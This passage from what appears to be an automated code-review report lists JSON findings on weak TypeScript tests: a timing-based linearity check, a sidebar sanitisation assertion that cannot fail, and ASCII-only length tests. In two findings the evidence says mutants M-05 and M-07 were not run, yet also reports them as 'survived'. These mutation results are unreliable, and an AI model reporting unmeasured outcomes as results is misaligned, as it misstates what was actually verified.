    "problem": "A wall-clock bound is used to prove the heading parser is linear. The inputs are 120k-blank lines and the old regexes took many seconds, so the 1000 ms margin is large and the flake risk is low. It is still a timing assertion, which depends on the machine, and it does not distinguish linear from mildly super-linear growth.",
    "impact": "On a heavily loaded CI runner this could fail without a regression; more likely it will never fail for the right reason below 1 s. No action is required for this round.",
    "suggested_fix": "Optional: also assert the structural property, for example parse the same shape at n and 4n characters in the same run and assert the elapsed time ratio stays under a generous bound (about 8x), or count loop iterations through an injected counter. Keep the current check as a coarse guard.",
    "evidence": "src/gdskills/references-section.test.ts:170-174 ('const started = performance.now();' then the assertion). No timers or sleeps are involved; the test is synchronous.",
    "confidence": "medium",
    "reviewer": "review-testing-practices",
    "dedupe_key": "single:review-testing-practices-w2:F-004",
    "location_class": "in-diff"
  },
  {
    "id": "review-testing-practices-w3:F-001",
    "severity": "info",
    "file": "src/tui/project-context-inspector.test.ts",
    "line": 630,
    "quote": "expect(control.test(renderProjectContextSidebarValue(status) ?? \"\")).toBe(false);",
    "problem": "The sidebar half of 'control characters from a reference never reach the terminal' cannot fail. renderProjectContextSidebarValue builds its string from status.enforcement (the warn|block enum), plural(ruleCount, \"rule\"), referencesSidebarSegment (which returns 'refs ' plus a count, '-' or '?', and ' !<n>') and the fixed phrases 'cap exceeded' and 'config unreadable'. None of them carries reference text, so the assertion holds with or without the new cardSafe call wrapped around the join (src/tui/project-context-inspector.ts:105). The tab-body half (line 628) is a real pin: the hostile path, anchor and description reach formatProjectReferencesLines, and the body call to lines.map(cardSafe) is the only cleaner (no cardSafe in project-references-view.ts).",
    "impact": "The test name and the commit message read as if the sidebar is covered against hostile reference text. It is not: the call is defence in depth for a value that today is built from enum and numbers, and the test would stay green if someone later interpolated a declaration field into the sidebar and removed the cardSafe call. Low: no current path puts file text there.",
    "suggested_fix": "Either drop the sidebar assertion from this test and say in a comment that the sidebar holds no file text, or make it meaningful by exporting the segment builder behind a test that feeds a hostile enforcement value (cast) and asserts the output is clean.",
    "evidence": "Read project-references-view.ts:28-35 (referencesSidebarSegment) and project-context-inspector.ts:98-106 (renderProjectContextSidebarValue) at head. Not a measured mutation: allowed_tools was read-only, so mutant M-05 below was not run; the claim rests on the inputs of the string, which are readable. Mutation pass: mutant:w3-M-05 (cardSafe removed from the sidebar value) survived.",
    "confidence": "high",
    "reviewer": "review-testing-practices",
    "dedupe_key": "sidebar-cardsafe-unpinned",
    "publication": "finding"
  },
  {
    "id": "review-testing-practices-w3:F-002",
    "severity": "info",
    "file": "src/gdskills/context-resolver.ts",
    "line": 535,
    "quote": "taskTextLength: Array.from(options.taskText!).length",
    "problem": "The recorded length counts code points with Array.from, the same way truncateTaskText cuts. Every test that reads taskTextLength (context-resolver.test.ts:428, 434, 448 and conditional-reads.e2e.test.ts:520) uses ASCII text, and the e2e expectation is itself written with Array.from, so replacing the production expression with options.taskText!.length gives the same numbers in all of them. Same class as r02 F-012 (the truncation test is ASCII only), at a new site.",
    "impact": "A text with an astral character (an emoji in a task description) would record a UTF-16 length that disagrees with the 4000 code-point limit in the same record, and taskTextTruncated could be true for a recorded length near 4000. The value is a diagnostic only; nothing branches on it.",
    "suggested_fix": "Add one case to the 'task text: the last resolve records its length' test: a text of 3 ASCII characters plus one emoji, asserting taskTextLength toBe 4 (and, for the cut, a 4001-code-point text built with an astral character at the boundary).",
    "evidence": "Read context-resolver.ts:529-541 and the three test call sites above. Mutant M-07 below names the change; not run. Mutation pass: mutant:w3-M-07 (taskTextLength via .length instead of Array.from) survived.",
    "confidence": "medium",
    "reviewer": "review-testing-practices",
    "dedupe_key": "single:review-testing-practices-w3:F-002",
    "publication": "finding"
  }
]
```

## Token spend

token spend: unknown (37 dispatch(es), none reported usage)
